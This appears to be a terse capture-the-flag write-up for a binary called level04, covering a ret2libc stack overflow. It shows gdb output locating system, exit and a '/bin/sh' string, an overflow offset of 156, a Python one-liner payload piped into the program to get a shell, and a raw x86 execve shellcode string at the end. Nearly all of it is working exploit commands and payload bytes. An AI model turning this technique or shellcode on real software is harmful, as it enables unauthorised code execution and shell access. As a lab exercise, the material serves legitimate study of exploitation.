forked process so for gdb: set follow-fork-mode child
because the gets() is in child

we can now search pattern to find the buffer overflow
(https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

overflow at offset 156

(gdb) p &system
$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
(gdb) p &exit
$2 = (<text variable, no debug info> *) 0xf7e5eb70 <exit>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec

exploit will be 156 padding + system() address + return address of system + /bin/sh address


(python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat -) | ./level04

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80